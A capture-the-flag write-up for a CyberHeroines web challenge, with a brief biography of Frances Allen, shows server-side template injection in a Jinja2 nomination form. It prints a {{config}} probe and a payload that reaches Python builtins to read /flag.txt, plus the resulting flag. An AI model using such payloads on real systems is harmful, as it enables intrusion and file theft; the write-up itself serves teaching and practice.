# Frances Allen

## Frances Elizabeth Allen

[Frances Elizabeth Allen](https://en.wikipedia.org/wiki/Frances_Allen)  (August 4, 1932 – August 4, 2020) was an American computer scientist and pioneer in the field of optimizing compilers. Allen was the first woman to become an IBM Fellow, and in 2006 became the first woman to win the Turing Award. Her achievements include seminal work in compilers, program optimization, and parallelization. She worked for IBM from 1957 to 2002 and subsequently was a Fellow Emerita. -  [Wikipedia Entry](https://en.wikipedia.org/wiki/Frances_Allen)

## Description

Chal: Build your best attack against this  [webapp](https://cyberheroines-web-srv5.chals.io/)  and inspire  [the first woman to win the Turing Award](https://www.youtube.com/watch?v=NjoU-MjCws4)

Alternate (Better) Link:  [Webapp](http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6266/)

Author:  [TJ](https://www.tjoconnor.org/)

## Solution

![Frances-Allen-1](/assets/ctf/cyberheroinesctf/frances-allen-1.png)

Application let's us _Nominate A Cyber Heroine_. 2 things quickly came to my mind: 1. SSTI and 2. Python Application.

![Frances-Allen-2](/assets/ctf/cyberheroinesctf/frances-allen-2.png)

![Frances-Allen-3](/assets/ctf/cyberheroinesctf/frances-allen-3.png)

[Wappalyzer](https://www.wappalyzer.com) confirms that application runs on Python, SSTI is confirmed by using ::: raw `{{config}}` ::: (Jinja2 syntax)

Time to visit good old HackTricks: <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti>

Using RCE file read payload let's try to read flag file.

::: raw
`{{ request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()  }}`
:::

`Nomination received for: Test with bio:chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`
::: tip Flag
`chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`
:::